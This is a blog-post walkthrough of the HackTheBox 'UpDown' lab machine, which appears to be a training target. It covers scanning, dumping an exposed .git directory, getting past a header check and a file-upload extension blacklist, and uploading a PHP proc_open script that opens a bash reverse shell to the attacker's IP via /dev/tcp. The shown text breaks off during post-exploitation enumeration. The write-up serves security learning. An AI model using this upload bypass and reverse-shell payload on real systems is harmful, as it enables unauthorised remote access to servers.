<!doctype html>
<html lang="en-us">
  <head>
    <title>HackTheBox UpDown // 53CTF</title>
    <link rel="shortcut icon" href="/favicon.ico" />
    <meta charset="utf-8" />
    <meta name="generator" content="Hugo 0.108.0">
    <meta name="viewport" content="width=device-width, initial-scale=1" />
    <meta name="author" content="5YC10P5" />
    <meta name="description" content="" />
    <link rel="stylesheet" href="/css/main.min.1b165e60871be07c93da04ef30238e50223c9da30f957d760f25b24143926af9.css" />

    
    <meta name="twitter:card" content="summary"/>
<meta name="twitter:title" content="HackTheBox UpDown"/>
<meta name="twitter:description" content="Name: UpDown IP: 10.10.11.177 Defficulty: Medium OS: Linux Author: AB2 Nmap 22/tcp open ssh syn-ack OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 3072 9e1f98d7c8ba61dbf149669d701702e7 (RSA) | ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDl7j17X/EWcm1MwzD7sKOFZyTUggWH1RRgwFbAK&#43;B6R28x47OJjQW8VO4tCjTyvqKBzpgg7r98xNEykmvnMr0V9eUhg6zf04GfS/gudDF3Fbr3XnZOsrMmryChQdkMyZQK1HULbqRij1tdHaxbIGbG5CmIxbh69mMwBOlinQINCStytTvZq4btP5xSMd8pyzuZdqw3Z58ORSnJAorhBXAmVa9126OoLx7AzL0aO3lqgWjo/wwd3FmcYxAdOjKFbIRiZK/f7RJHty9P2WhhmZ6mZBSTAvIJ36Kb4Z0NuZ&#43;ztfZCCDEw3z3bVXSVR/cp0Z0186gkZv8w8cp/ZHbtJB/nofzEBEeIK8gZqeFc/hwrySA6yBbSg0FYmXSvUuKgtjTgbZvgog66h&#43;98XUgXheX1YPDcnUU66zcZbGsSM1aw1sMqB1vHhd2LGeY8UeQ1pr&#43;lppDwMgce8DO141tj&#43;ozjJouy19Tkc9BB46FNJ43Jl58CbLPdHUcWeMbjwauMrw0= | 256 c21cfe1152e3d7e5f759186b68453f62 (ECDSA) | ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBKMJ3/md06ho&#43;1RKACqh2T8urLkt1ST6yJ9EXEkuJh0UI/zFcIffzUOeiD2ZHphWyvRDIqm7ikVvNFmigSBUpXI= | 256 5f6e12670a66e8e2b761bec4143ad38e (ED25519) |_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIL1VZrZbtNuK2LKeBBzfz0gywG4oYxgPl&#43;s5QENjani1 80/tcp open http syn-ack Apache httpd 2.4.41 ((Ubuntu)) | http-methods: |_ Supported Methods: GET HEAD POST OPTIONS |_http-server-header: Apache/2.4.41 (Ubuntu) |_http-title: Is my Website up ?"/>

    <meta property="og:title" content="HackTheBox UpDown" />
<meta property="og:description" content="Name: UpDown IP: 10.10.11.177 Defficulty: Medium OS: Linux Author: AB2 Nmap 22/tcp open ssh syn-ack OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 3072 9e1f98d7c8ba61dbf149669d701702e7 (RSA) | ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDl7j17X/EWcm1MwzD7sKOFZyTUggWH1RRgwFbAK&#43;B6R28x47OJjQW8VO4tCjTyvqKBzpgg7r98xNEykmvnMr0V9eUhg6zf04GfS/gudDF3Fbr3XnZOsrMmryChQdkMyZQK1HULbqRij1tdHaxbIGbG5CmIxbh69mMwBOlinQINCStytTvZq4btP5xSMd8pyzuZdqw3Z58ORSnJAorhBXAmVa9126OoLx7AzL0aO3lqgWjo/wwd3FmcYxAdOjKFbIRiZK/f7RJHty9P2WhhmZ6mZBSTAvIJ36Kb4Z0NuZ&#43;ztfZCCDEw3z3bVXSVR/cp0Z0186gkZv8w8cp/ZHbtJB/nofzEBEeIK8gZqeFc/hwrySA6yBbSg0FYmXSvUuKgtjTgbZvgog66h&#43;98XUgXheX1YPDcnUU66zcZbGsSM1aw1sMqB1vHhd2LGeY8UeQ1pr&#43;lppDwMgce8DO141tj&#43;ozjJouy19Tkc9BB46FNJ43Jl58CbLPdHUcWeMbjwauMrw0= | 256 c21cfe1152e3d7e5f759186b68453f62 (ECDSA) | ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBKMJ3/md06ho&#43;1RKACqh2T8urLkt1ST6yJ9EXEkuJh0UI/zFcIffzUOeiD2ZHphWyvRDIqm7ikVvNFmigSBUpXI= | 256 5f6e12670a66e8e2b761bec4143ad38e (ED25519) |_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIL1VZrZbtNuK2LKeBBzfz0gywG4oYxgPl&#43;s5QENjani1 80/tcp open http syn-ack Apache httpd 2.4.41 ((Ubuntu)) | http-methods: |_ Supported Methods: GET HEAD POST OPTIONS |_http-server-header: Apache/2.4.41 (Ubuntu) |_http-title: Is my Website up ?" />
<meta property="og:type" content="article" />
<meta property="og:url" content="https://53ctf.github.io/posts/htb/updown/" /><meta property="article:section" content="posts" />
<meta property="article:published_time" content="2023-01-17T08:00:10+05:30" />
<meta property="article:modified_time" content="2023-01-17T08:00:10+05:30" />


  </head>
  <body>
    <header class="app-header">
      <a href="https://53ctf.github.io/"><img class="app-header-avatar" src="/avatar.jpg" alt="5YC10P5" /></a>
      <span class="app-header-title">53CTF</span>
      <nav class="app-header-menu">
          <a class="app-header-menu-item" href="/">Home</a>
             - 
          
          <a class="app-header-menu-item" href="/tags/hackthebox/">HTB</a>
             - 
          
          <a class="app-header-menu-item" href="/tags/notes/">Notes</a>
             - 
          
          <a class="app-header-menu-item" href="/about/">About</a>
      </nav>
      <p>This is where I keep my notes and also where I post articles, writeups, walkthroughs and stuff like that so everybody else can learn something out of it.....</p>
      <div class="app-header-social">
        
          <a href="https://github.com/53ctf" target="_blank" rel="noreferrer noopener me">
            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-github">
  <title>Github</title>
  <path d="M9 19c-5 1.5-5-2.5-7-3m14 6v-3.87a3.37 3.37 0 0 0-.94-2.61c3.14-.35 6.44-1.54 6.44-7A5.44 5.44 0 0 0 20 4.77 5.07 5.07 0 0 0 19.91 1S18.73.65 16 2.48a13.38 13.38 0 0 0-7 0C6.27.65 5.09 1 5.09 1A5.07 5.07 0 0 0 5 4.77a5.44 5.44 0 0 0-1.5 3.78c0 5.42 3.3 6.61 6.44 7A3.37 3.37 0 0 0 9 18.13V22"></path>
</svg>
          </a>
        
          <a href="https://twitter.com/syclops101" target="_blank" rel="noreferrer noopener me">
            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-twitter">
  <title>Twitter</title>
  <path d="M23 3a10.9 10.9 0 0 1-3.14 1.53 4.48 4.48 0 0 0-7.86 3v1A10.66 10.66 0 0 1 3 4s-4 9 5 13a11.64 11.64 0 0 1-7 2c9 5 20 0 20-11.5a4.5 4.5 0 0 0-.08-.83A7.72 7.72 0 0 0 23 3z"></path>
</svg>
          </a>
        
          <a href="https://web.facebook.com/syclops101" target="_blank" rel="noreferrer noopener me">
            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-facebook">
  <title>HackTheBox</title>
  <path d="M18 2h-3a5 5 0 0 0-5 5v3H7v4h3v8h4v-8h3l1-4h-4V7a1 1 0 0 1 1-1h3z"></path>
</svg>
          </a>
        
      </div>
    </header>
    <main class="app-container">
      
  <article class="post">
    <header class="post-header">
      <h1 class ="post-title">HackTheBox UpDown</h1>
      <div class="post-meta">
        <div>
          <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-calendar">
  <title>calendar</title>
  <rect x="3" y="4" width="18" height="18" rx="2" ry="2"></rect><line x1="16" y1="2" x2="16" y2="6"></line><line x1="8" y1="2" x2="8" y2="6"></line><line x1="3" y1="10" x2="21" y2="10"></line>
</svg>
          Jan 17, 2023
        </div>
        <div>
          <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-clock">
  <title>clock</title>
  <circle cx="12" cy="12" r="10"></circle><polyline points="12 6 12 12 16 14"></polyline>
</svg>
          8 min read
        </div>
        <div>
          <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-tag">
  <title>tag</title>
  <path d="M20.59 13.41l-7.17 7.17a2 2 0 0 1-2.83 0L2 12V2h10l8.59 8.59a2 2 0 0 1 0 2.82z"></path><line x1="7" y1="7" x2="7.01" y2="7"></line>
</svg>
              <a class="tag" href="https://53ctf.github.io/tags/hackthebox/">HackTheBox</a>
              <a class="tag" href="https://53ctf.github.io/tags/git/">Git</a>
              <a class="tag" href="https://53ctf.github.io/tags/proc_open/">proc_open</a>
              <a class="tag" href="https://53ctf.github.io/tags/easy_install/">easy_install</a>
        </div>
      </div>
    </header>
    <div class="post-content">
      <ul>
<li>Name: UpDown</li>
<li>IP: 10.10.11.177</li>
<li>Defficulty: Medium</li>
<li>OS: Linux</li>
<li>Author: <a href="https://www.hackthebox.com/home/users/profile/1303">AB2</a></li>
</ul>
<h2 id="nmap">Nmap</h2>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>22/tcp open  ssh     syn-ack OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 <span style="color:#f92672">(</span>Ubuntu Linux; protocol 2.0<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>| ssh-hostkey:
</span></span><span style="display:flex;"><span>|   <span style="color:#ae81ff">3072</span> 9e1f98d7c8ba61dbf149669d701702e7 <span style="color:#f92672">(</span>RSA<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDl7j17X/EWcm1MwzD7sKOFZyTUggWH1RRgwFbAK+B6R28x47OJjQW8VO4tCjTyvqKBzpgg7r98xNEykmvnMr0V9eUhg6zf04GfS/gudDF3Fbr3XnZOsrMmryChQdkMyZQK1HULbqRij1tdHaxbIGbG5CmIxbh69mMwBOlinQINCStytTvZq4btP5xSMd8pyzuZdqw3Z58ORSnJAorhBXAmVa9126OoLx7AzL0aO3lqgWjo/wwd3FmcYxAdOjKFbIRiZK/f7RJHty9P2WhhmZ6mZBSTAvIJ36Kb4Z0NuZ+ztfZCCDEw3z3bVXSVR/cp0Z0186gkZv8w8cp/ZHbtJB/nofzEBEeIK8gZqeFc/hwrySA6yBbSg0FYmXSvUuKgtjTgbZvgog66h+98XUgXheX1YPDcnUU66zcZbGsSM1aw1sMqB1vHhd2LGeY8UeQ1pr+lppDwMgce8DO141tj+ozjJouy19Tkc9BB46FNJ43Jl58CbLPdHUcWeMbjwauMrw0<span style="color:#f92672">=</span>
</span></span><span style="display:flex;"><span>|   <span style="color:#ae81ff">256</span> c21cfe1152e3d7e5f759186b68453f62 <span style="color:#f92672">(</span>ECDSA<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBKMJ3/md06ho+1RKACqh2T8urLkt1ST6yJ9EXEkuJh0UI/zFcIffzUOeiD2ZHphWyvRDIqm7ikVvNFmigSBUpXI<span style="color:#f92672">=</span>
</span></span><span style="display:flex;"><span>|   <span style="color:#ae81ff">256</span> 5f6e12670a66e8e2b761bec4143ad38e <span style="color:#f92672">(</span>ED25519<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIL1VZrZbtNuK2LKeBBzfz0gywG4oYxgPl+s5QENjani1
</span></span><span style="display:flex;"><span>80/tcp open  http    syn-ack Apache httpd 2.4.41 <span style="color:#f92672">((</span>Ubuntu<span style="color:#f92672">))</span>
</span></span><span style="display:flex;"><span>| http-methods:
</span></span><span style="display:flex;"><span>|_  Supported Methods: GET HEAD POST OPTIONS
</span></span><span style="display:flex;"><span>|_http-server-header: Apache/2.4.41 <span style="color:#f92672">(</span>Ubuntu<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>|_http-title: Is my Website up ?
</span></span><span style="display:flex;"><span>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
</span></span></code></pre></div><p>Two ports are open.</p>
<ul>
<li><strong>22/TCP SSH</strong>
<ul>
<li>OpenSSH 8.2p1</li>
<li>And its banner says that this is an <a href="https://launchpad.net/ubuntu/+source/openssh/1:7.6p1-4ubuntu0.5">Ubuntu</a> Box</li>
</ul>
</li>
<li><strong>80/TCP HTTP</strong>
<ul>
<li>Apache httpd 2.4.41</li>
<li>According to the <a href="https://www.apache.org/">Apache</a> version, this could be an <a href="https://releases.ubuntu.com/focal/">Ubuntu Focal Fossa</a>.</li>
</ul>
</li>
</ul>
<h2 id="web-enumeration">Web Enumeration</h2>
<p>When we go to the <a href="http://10.10.11.177/">http://10.10.11.177/</a>, we can see a domain <code>siteisup.htb</code>. So let&rsquo;s add that to <code>/etc/hosts</code>.</p>
<h3 id="subdomain-fuzzing">Subdomain Fuzzing</h3>
<p>Found one subdomain. Add that to <code>/etc/hosts</code> as well.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>&gt; ffuf -u http://10.10.11.177/ -H <span style="color:#e6db74">&#34;Host: FUZZ.siteisup.htb&#34;</span> -w /usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt -c -mc all -fs <span style="color:#ae81ff">1131</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>dev                     <span style="color:#f92672">[</span>Status: 403, Size: 281, Words: 20, Lines: 10, Duration: 7547ms<span style="color:#f92672">]</span>
</span></span></code></pre></div><h3 id="direcotory-fuzzing">Direcotory Fuzzing</h3>
<p>Found two directories under <code>http://siteisup.htb</code>.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>&gt; dirsearch -u http://siteisup.htb -r
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>08:32:44<span style="color:#f92672">]</span> <span style="color:#ae81ff">200</span> -    0B  - /dev/
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>08:52:03<span style="color:#f92672">]</span> <span style="color:#ae81ff">200</span> -  602B  - /dev/.git/
</span></span></code></pre></div><p><code>http://siteisup.htb</code> is a website where we can test if websites are up or downed. To confirm that, start a python webserver and put it to the site and press check. And as we assumed, site is checking if the given site is up or downed <em>(by sending a curl request to the given URL)</em>. In this case, our site is showing up.<br>
<img src="images/1.png" alt="Site Test"></p>
<p><code>http://siteisup.htb/dev</code> Leads us to nowhere.</p>
<p>Once we visit the <a href="http://dev.siteisup.htb">http://dev.siteisup.htb</a>, it gives us a 403. So that means we have to authenticate somehow in order to view that site.</p>
<p>But as we saw earlier, we foud and <code>.git</code> directory. Let&rsquo;s dump that into our local machine using <a href="https://github.com/arthaud/git-dumper">Git-Dumper</a>.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>&gt; python3 -m git_dumper http://siteisup.htb/dev/.git git
</span></span></code></pre></div><p>View all the git commits.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>&gt; git log --oneline
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>010dcc3 <span style="color:#f92672">(</span>HEAD -&gt; main, origin/main, origin/HEAD<span style="color:#f92672">)</span> Delete index.php
</span></span><span style="display:flex;"><span>c8fcc40 Update checker.php
</span></span><span style="display:flex;"><span>f67efd0 Create checker.php
</span></span><span style="display:flex;"><span>ab9bc16 Update changelog.txt
</span></span><span style="display:flex;"><span>60d2b32 Create admin.php
</span></span><span style="display:flex;"><span>c1998f8 Add admin panel.
</span></span><span style="display:flex;"><span>35a3801 Update changelog.txt
</span></span><span style="display:flex;"><span>57af03b Create index.php
</span></span><span style="display:flex;"><span>354fe06 Delete .htpasswd
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">8812785</span> New technique in header to protect our dev vhost.
</span></span><span style="display:flex;"><span>bc4ba79 Update .htaccess
</span></span><span style="display:flex;"><span>61e5cc0 Update index.php
</span></span><span style="display:flex;"><span>3d66cd4 Create changelog.txt
</span></span><span style="display:flex;"><span>4fb1927 Create stylesheet.css
</span></span><span style="display:flex;"><span>6f89af7 Create index.php
</span></span><span style="display:flex;"><span>8d1beb1 Create .htpasswd
</span></span><span style="display:flex;"><span>6ddcc7a Create .htaccess
</span></span></code></pre></div><p>This commit looks interesting.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#ae81ff">8812785</span> New technique in header to protect our dev vhost.
</span></span></code></pre></div><p>Let&rsquo;s see what they did to protect their <code>dev</code> vhost.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>&gt; git show <span style="color:#ae81ff">8812785</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>commit 8812785e31c879261050e72e20f298ae8c43b565
</span></span><span style="display:flex;"><span>Author: Abdou.Y &lt;84577967+ab2pentest@users.noreply.github.com&gt;
</span></span><span style="display:flex;"><span>Date:   Wed Oct <span style="color:#ae81ff">20</span> 16:38:54 <span style="color:#ae81ff">2021</span> +0200
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    New technique in header to protect our dev vhost.
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>diff --git a/.htaccess b/.htaccess
</span></span><span style="display:flex;"><span>index 44ff240..b317ab5 <span style="color:#ae81ff">100644</span>
</span></span><span style="display:flex;"><span>--- a/.htaccess
</span></span><span style="display:flex;"><span>+++ b/.htaccess
</span></span><span style="display:flex;"><span>@@ -2,3 +2,4 @@ SetEnvIfNoCase Special-Dev <span style="color:#e6db74">&#34;only4dev&#34;</span> Required-Header
</span></span><span style="display:flex;"><span> Order Deny,Allow
</span></span><span style="display:flex;"><span> Deny from All
</span></span><span style="display:flex;"><span> Allow from env<span style="color:#f92672">=</span>Required-Header
</span></span><span style="display:flex;"><span>+
</span></span></code></pre></div><p>Looks like they are requiring a special header in order to access the <code>http://dev.siteisup.htb</code>. Let&rsquo;s intercept the request from [BurpSuite] and add the special header to see if it is working or not.
<img src="images/2.png" alt="Burp Test"></p>
<p>It looks like we have to add that <strong>Special Header</strong> to every request that we are sending to the server and that will be a so much pain. So let&rsquo;s automate that with BurpSuite.</p>
<p>Go to <code>Proxy &gt; Options &gt; Match and Replace</code> and add new header like this.
<img src="images/4.png" alt="Header"></p>
<p>And now we have to use <code>Burp Browser</code> and we can access <code>http://dev.siteisup.htb</code> without any problem.</p>
<p>Looks like now we can upload files.<br>
<img src="images/5.png" alt="Dev Site"></p>
<p>With the help of the <code>Special-Dev: only4dev</code> Header I found one directory under <code>http://dev.siteisup.htb/</code>.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>&gt; ffuf -request dev.req -request-proto http -w /usr/share/wordlists/dirb/big.txt -c -mc all -fc 403,404
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>uploads                 <span style="color:#f92672">[</span>Status: 301, Size: 322, Words: 20, Lines: 10, Duration: 211ms<span style="color:#f92672">]</span>
</span></span></code></pre></div><h2 id="foothold-www-data">Foothold [www-data]</h2>
<p>Since we can upload files and we have <code>uploads</code> directory, maybe now we can get a reverse shell with the help of <a href="https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php">php-reverse-shell.php</a>.</p>
<p>But once I tried to upload the <code>shell.php</code>, it said that <code>Extension not allowed</code>. So we have to find allowed extension. So I managed to find some working extensions by fuzzing the extension.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>&gt; ffuf -request upload.req -request-proto http -w extensions.txt -r -c
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>.php                    <span style="color:#f92672">[</span>Status: 200, Size: 534, Words: 3, Lines: 2, Duration: 248ms<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>.php7                   <span style="color:#f92672">[</span>Status: 200, Size: 534, Words: 3, Lines: 2, Duration: 248ms<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>.hphp                   <span style="color:#f92672">[</span>Status: 200, Size: 534, Words: 3, Lines: 2, Duration: 249ms<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>.ctp                    <span style="color:#f92672">[</span>Status: 200, Size: 3083, Words: 10, Lines: 13, Duration: 285ms<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>.inc                    <span style="color:#f92672">[</span>Status: 200, Size: 3083, Words: 10, Lines: 13, Duration: 286ms<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>.php2                   <span style="color:#f92672">[</span>Status: 200, Size: 534, Words: 3, Lines: 2, Duration: 288ms<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>.php6                   <span style="color:#f92672">[</span>Status: 200, Size: 534, Words: 3, Lines: 2, Duration: 299ms<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>.php4                   <span style="color:#f92672">[</span>Status: 200, Size: 534, Words: 3, Lines: 2, Duration: 311ms<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>.phtm                   <span style="color:#f92672">[</span>Status: 200, Size: 3083, Words: 10, Lines: 13, Duration: 341ms<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>.pgif                   <span style="color:#f92672">[</span>Status: 200, Size: 3083, Words: 10, Lines: 13, Duration: 348ms<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>.phps                   <span style="color:#f92672">[</span>Status: 200, Size: 534, Words: 3, Lines: 2, Duration: 495ms<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>.phps                   <span style="color:#f92672">[</span>Status: 200, Size: 534, Words: 3, Lines: 2, Duration: 495ms<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>.phtml                  <span style="color:#f92672">[</span>Status: 200, Size: 534, Words: 3, Lines: 2, Duration: 495ms<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>.php5                   <span style="color:#f92672">[</span>Status: 200, Size: 534, Words: 3, Lines: 2, Duration: 506ms<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>.module                 <span style="color:#f92672">[</span>Status: 200, Size: 3083, Words: 10, Lines: 13, Duration: 524ms<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>.htaccess               <span style="color:#f92672">[</span>Status: 200, Size: 3083, Words: 10, Lines: 13, Duration: 525ms<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>.phar                   <span style="color:#f92672">[</span>Status: 200, Size: 3083, Words: 10, Lines: 13, Duration: 531ms<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>.pht                    <span style="color:#f92672">[</span>Status: 200, Size: 3083, Words: 10, Lines: 13, Duration: 535ms<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>.shtml                  <span style="color:#f92672">[</span>Status: 200, Size: 534, Words: 3, Lines: 2, Duration: 560ms<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>.php3                   <span style="color:#f92672">[</span>Status: 200, Size: 534, Words: 3, Lines: 2, Duration: 561ms<span style="color:#f92672">]</span>
</span></span></code></pre></div><p>According to the results, we can use <code>.ctp .inc .phtm .pgif .module .htaccess .phar .pht</code> extensions. This is a good example of why you shouldn&rsquo;t be using a <code>blacklist</code> instead of a <code>whitelist</code>.</p>
<p>Anyways I uploaded the <code>shell.phar</code> to the server and it started to ping all the lines of the payload and after that it imediately deleted <code>shell.phar</code> from the server. So we have to buy some more time to execute out payload. So let&rsquo;s add some invalid URLs to the top of the payload so we can get some more time while the site is trying to check them.</p>
<p>If we look for <code>phpinfo()</code>, we can see most of the function that we use to get a reverse shell are disabled.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span> <span style="color:#a6e22e">phpinfo</span>(); <span style="color:#75715e">?&gt;</span><span style="color:#960050;background-color:#1e0010">
</span></span></span></code></pre></div><p><img src="images/6.png" alt="Functions">
But <code>proc_open()</code> function is not diabled. So we can crafted a script using <a href="https://chat.openai.com/">ChatGPT</a>.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span>
</span></span><span style="display:flex;"><span>$descriptorspec <span style="color:#f92672">=</span> <span style="color:#66d9ef">array</span>(
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0</span> <span style="color:#f92672">=&gt;</span> <span style="color:#66d9ef">array</span>(<span style="color:#e6db74">&#34;pipe&#34;</span>, <span style="color:#e6db74">&#34;r&#34;</span>),
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">1</span> <span style="color:#f92672">=&gt;</span> <span style="color:#66d9ef">array</span>(<span style="color:#e6db74">&#34;pipe&#34;</span>, <span style="color:#e6db74">&#34;w&#34;</span>),
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">2</span> <span style="color:#f92672">=&gt;</span> <span style="color:#66d9ef">array</span>(<span style="color:#e6db74">&#34;file&#34;</span>, <span style="color:#e6db74">&#34;/tmp/error-output.txt&#34;</span>, <span style="color:#e6db74">&#34;a&#34;</span>)
</span></span><span style="display:flex;"><span>);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>$cwd <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;/tmp&#39;</span>;
</span></span><span style="display:flex;"><span>$env <span style="color:#f92672">=</span> <span style="color:#66d9ef">array</span>(<span style="color:#e6db74">&#39;some_option&#39;</span> <span style="color:#f92672">=&gt;</span> <span style="color:#e6db74">&#39;aeiou&#39;</span>);
</span></span><span style="display:flex;"><span>$process <span style="color:#f92672">=</span> <span style="color:#a6e22e">proc_open</span>(<span style="color:#e6db74">&#39;bash&#39;</span>, $descriptorspec, $pipes, $cwd, $env);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">is_resource</span>($process)) {
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">fwrite</span>($pipes[<span style="color:#ae81ff">0</span>], <span style="color:#e6db74">&#39;bash -i &gt;&amp; /dev/tcp/10.10.14.16/5369 0&gt;&amp;1&#39;</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">fclose</span>($pipes[<span style="color:#ae81ff">0</span>]);
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">fclose</span>($pipes[<span style="color:#ae81ff">1</span>]);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span><span style="color:#75715e">?&gt;</span><span style="color:#960050;background-color:#1e0010">
</span></span></span></code></pre></div><p>Let&rsquo;s use this payload to get a reverse shell.</p>
<p>And got a reverse shell as the user <code>www-data</code>.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>www-data@updown:/tmp$ whoami
</span></span><span style="display:flex;"><span>www-data
</span></span><span style="display:flex;"><span>www-data@updown:/tmp$ id
</span></span><span style="display:flex;"><span>uid<span style="color:#f92672">=</span>33<span style="color:#f92672">(</span>www-data<span style="color:#f92672">)</span> gid<span style="color:#f92672">=</span>33<span style="color:#f92672">(</span>www-data<span style="color:#f92672">)</span> groups<span style="color:#f92672">=</span>33<span style="color:#f92672">(</span>www-data<span style="color:#f92672">)</span>
</span></span></code></pre></div><p>Looks like we have a user named <code>developer</code>.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>www-data@updown:/home$ cat /etc/passwd | grep sh
</span></span><span style="display:flex;"><span>root:x:0:0:root:/root:/bin/bash
